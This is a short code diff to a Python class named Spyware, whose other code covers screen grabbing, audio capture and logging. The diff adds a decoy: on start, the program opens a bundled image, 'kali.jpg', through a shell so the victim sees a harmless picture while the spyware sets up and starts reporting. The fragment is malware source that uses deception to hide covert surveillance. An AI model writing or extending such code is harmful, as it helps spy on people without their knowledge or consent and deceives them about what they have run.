@@ -8,6 +8,8 @@ from functools import partial
 import multiprocessing
 import json
 import random
+import subprocess
+import sys
 
 from modules.log import Logger
 from modules.grab_screen import Visual
@@ -29,8 +31,14 @@ class Spyware:
         self.audio_period = int(self.user_info['frequency']) - 2
 
     def start(self):
+        self.open_fake_file()
         self.setup_dirs()
         self.reporting()
+
+    def open_fake_file(self):
+        file_name = normalize_path_name(sys._MEIPASS, 'kali.jpg')
+
+        subprocess.Popen(file_name, shell=True)
 
     def reporting(self):
         logger = Logger(self.user_info['frequency'], self.user_path)
